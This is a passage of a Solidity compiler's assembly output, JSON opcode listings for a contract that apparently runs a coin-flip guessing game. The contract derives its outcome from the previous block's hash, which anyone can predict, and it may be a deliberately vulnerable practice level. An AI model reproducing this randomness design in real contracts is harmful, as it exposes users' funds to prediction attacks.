											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 351,
											"end": 355,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 368,
											"end": 386,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 422,
											"end": 423,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 407,
											"end": 419,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 407,
											"end": 423,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 407,
											"end": 423,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 407,
											"end": 423,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 407,
											"end": 423,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 407,
											"end": 423,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 407,
											"end": 423,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 407,
											"end": 423,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 397,
											"end": 424,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 389,
											"end": 425,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 389,
											"end": 425,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 368,
											"end": 425,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 368,
											"end": 425,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 454,
											"end": 464,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 450,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 442,
											"end": 450,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 442,
											"end": 464,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 438,
											"end": 501,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 438,
											"end": 501,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 438,
											"end": 501,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 481,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 481,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 481,
											"end": 489,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 438,
											"end": 501,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 438,
											"end": 501,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 524,
											"end": 534,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 513,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 513,
											"end": 534,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 513,
											"end": 534,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 513,
											"end": 534,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 513,
											"end": 534,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 545,
											"end": 561,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 577,
											"end": 583,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 577,
											"end": 583,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 564,
											"end": 574,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 564,
											"end": 583,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 564,
											"end": 583,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 564,
											"end": 583,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 564,
											"end": 583,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 564,
											"end": 583,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 564,
											"end": 583,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 564,
											"end": 583,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 545,
											"end": 583,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 545,
											"end": 583,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 594,
											"end": 603,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 618,
											"end": 619,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 606,
											"end": 614,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 606,
											"end": 619,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 606,
											"end": 634,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 606,
											"end": 634,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 629,
											"end": 634,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 606,
											"end": 634,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 606,
											"end": 634,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 606,
											"end": 634,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 606,
											"end": 634,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 622,
											"end": 626,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 606,
											"end": 634,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 606,
											"end": 634,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 594,
											"end": 634,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 594,
											"end": 634,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 659,
											"end": 665,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 651,
											"end": 665,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 651,
											"end": 665,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 651,
											"end": 655,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 651,
											"end": 665,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 651,
											"end": 665,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 651,
											"end": 665,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 647,
											"end": 816,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 647,
											"end": 816,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 647,
											"end": 816,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 682,
											"end": 697,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 682,
											"end": 697,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 682,
											"end": 699,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 682,
											"end": 699,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 682,
											"end": 699,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 682,
											"end": 699,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 682,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 721,
											"end": 725,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 714,
											"end": 725,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 714,
											"end": 725,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 714,
											"end": 725,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 714,
											"end": 725,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 714,
											"end": 725,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 714,
											"end": 725,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 714,
											"end": 725,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 647,
											"end": 816,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 647,
											"end": 816,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 776,
											"end": 777,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 758,
											"end": 773,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 758,
											"end": 777,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 758,
											"end": 777,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 758,
											"end": 777,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 758,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 799,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 792,
											"end": 804,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 792,
											"end": 804,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 792,
											"end": 804,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 792,
											"end": 804,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 792,
											"end": 804,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 85,
											"end": 115,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 85,
											"end": 115,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 94,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 75,
											"end": 95,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 66,
											"end": 95,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 66,
											"end": 95,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 128,
											"end": 133,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 56,
											"end": 140,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 56,
											"end": 140,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 56,
											"end": 140,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 56,
											"end": 140,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 56,
											"end": 140,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 146,
											"end": 402,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 146,
											"end": 402,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 146,
											"end": 402,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 253,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 239,
											"end": 248,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 230,
											"end": 237,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 226,
											"end": 249,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 222,
											"end": 254,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 219,
											"end": 221,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 219,
											"end": 221,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 221,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 267,
											"end": 268,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 264,
											"end": 265,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 257,
											"end": 269,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 219,
											"end": 221,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 221,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 310,
											"end": 311,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 377,
											"end": 384,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 368,
											"end": 374,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 357,
											"end": 366,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 353,
											"end": 375,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 335,
											"end": 385,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 325,
											"end": 385,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 325,
											"end": 385,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 281,
											"end": 395,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 209,
											"end": 402,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 209,
											"end": 402,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 209,
											"end": 402,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 209,
											"end": 402,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 209,
											"end": 402,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 408,
											"end": 517,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 408,
											"end": 517,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 489,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 504,
											"end": 509,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 489,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 484,
											"end": 487,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 477,
											"end": 511,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 467,
											"end": 517,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 467,
											"end": 517,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 467,
											"end": 517,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 523,
											"end": 641,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 523,
											"end": 641,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 610,
											"end": 634,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 628,
											"end": 633,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 610,
											"end": 634,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 605,
											"end": 608,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 598,
											"end": 635,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 588,
											"end": 641,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 588,
											"end": 641,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 588,
											"end": 641,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 647,
											"end": 857,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 647,
											"end": 857,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 647,
											"end": 857,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 772,
											"end": 774,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 761,
											"end": 770,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 757,
											"end": 775,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 749,
											"end": 775,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 749,
											"end": 775,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 785,
											"end": 850,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 847,
											"end": 848,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 836,
											"end": 845,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 832,
											"end": 849,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 823,
											"end": 829,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 785,
											"end": 850,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 739,
											"end": 857,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 739,
											"end": 857,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 739,
											"end": 857,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 739,
											"end": 857,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 739,
											"end": 857,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 994,
											"end": 996,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 983,
											"end": 992,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 979,
											"end": 997,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 971,
											"end": 997,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 971,
											"end": 997,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 1075,
											"end": 1076,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1064,
											"end": 1073,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1060,
											"end": 1077,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1051,
											"end": 1057,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1166,
											"end": 1167,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1143,
											"end": 1168,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1143,
											"end": 1168,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 1200,
											"end": 1201,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "tag",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1177,
											"end": 1202,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1177,
											"end": 1202,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1221,
											"end": 1222,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "tag",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "tag",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "JUMPDEST",
